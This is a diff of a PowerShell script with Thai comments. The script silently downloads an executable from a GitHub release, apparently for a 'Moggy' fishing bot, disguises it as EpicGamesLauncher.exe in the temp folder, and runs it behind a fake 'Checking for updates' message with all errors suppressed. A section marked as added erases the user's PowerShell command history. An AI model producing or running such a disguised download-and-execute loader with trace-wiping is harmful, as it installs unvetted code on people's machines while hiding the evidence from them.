@@ -7,14 +7,21 @@ $ErrorActionPreference = "SilentlyContinue"
 
 # 1. ข้อมูลไฟล์และลิงก์
 $downloadUrl = "https://github.com/GRILLYje/Fishing_Moggy_public/releases/download/V1.0.2/EpicGamesLauncher.exe" 
-$tempPath = "$env:TEMP\EpicGamesLauncher.exe"
+
+# สร้างโฟลเดอร์แยกสำหรับ Moggy
+$folderPath = "$env:TEMP\Moggy"
+if (-not (Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
+}
+
+$tempPath = "$folderPath\EpicGamesLauncher.exe"
 
 # 2. เช็คไฟล์เก่าและลบทิ้ง
 if (Test-Path $tempPath) {
     Remove-Item $tempPath -Force
 }
 
-Write-Host "Checking for updates" -ForegroundColor Cyan
+Write-Host "Checking for updates (Moggy)" -ForegroundColor Cyan
 
 # 3. ดาวน์โหลดไฟล์ (WebClient)
 try {
@@ -22,7 +29,6 @@ try {
     $webClient.DownloadFile($downloadUrl, $tempPath)
     $webClient.Dispose()
 } catch {
-    # 💡 ถ้ายังโหลดไม่ผ่านอีก ให้ลองเอา $ErrorActionPreference บรรทัดบนสุดออก เพื่อดู Error จริงๆ
     Write-Host "An error occurred while downloading the file" -ForegroundColor Red
     Exit
 }
@@ -31,19 +37,14 @@ try {
 # 🌟 ส่วนที่เพิ่ม: ลบประวัติ PowerShell History
 # ==========================================
 try {
-    # ค้นหาตำแหน่งไฟล์ประวัติ (ConsoleHost_history.txt) ของเครื่องนั้นๆ
     $historyPath = (Get-PSReadLineOption).HistorySavePath
     if (Test-Path $historyPath) {
-        # ล้างข้อมูลในไฟล์ให้ว่างเปล่า
         Clear-Content -Path $historyPath
     }
-    # ล้างประวัติใน Session ปัจจุบันด้วย
     Clear-History
-} catch {
-    # ถ้าเครื่องลูกค้าไม่มี PSReadLine หรือหาไฟล์ไม่เจอ ให้ข้ามไป
-}
+} catch {}
 # ==========================================
 
 # 4. รันโปรแกรม 
-Write-Host "Launching" -ForegroundColor Green
+Write-Host "Launching Moggy" -ForegroundColor Green
 Start-Process -FilePath $tempPath
